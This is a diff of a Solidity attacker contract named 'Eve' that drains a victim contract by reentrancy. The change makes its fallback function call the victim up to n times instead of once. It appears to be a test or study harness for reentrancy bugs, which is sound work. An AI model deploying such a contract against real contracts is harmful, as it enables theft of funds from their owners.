@@ -8,39 +8,34 @@ contract Eve {
        bool useReentrancy;
        address victim;
        event fallbackCalled(uint amount, bool useReentrancy);
+       uint numberOfReentrantCalls;
+       uint n;
        
        function Eve() public payable {}
 
    
     
-    function exploitReentrancy(address _a, uint _amount, bool _useReentrancy) public {
-       //a.call(bytes4(sha3("buyTokens(address _beneficiary)")), this.address, {value: 50});
-        alreadyCalled = false;
+    function exploitReentrancy(address _a, uint _amount, uint _n) public {
+        numberOfReentrantCalls = 0;
+        n = _n;
         tokenAmount = _amount;
         victim = _a;
-        useReentrancy = _useReentrancy;
+        
         victim.call.value(_amount)();
-        
-        
-        //a.send(amount);
-       //a.transfer(amount);
-        
-    }
+        }
 
-   /* function() withdraw public onlyOwner () {
-        token.transfer(msg.sender, token.balances[this.address]);
-    }*/
+  
 
 
     
     function() payable public {
         fallbackCalled(tokenAmount, useReentrancy);
-        if(useReentrancy) {
+        if(n>0) {
             
-        if(alreadyCalled == true) {
+        if(numberOfReentrantCalls >= n) {
             return;
        }
-        alreadyCalled = true;
+        numberOfReentrantCalls++;
        
         victim.call.value(tokenAmount)();
         
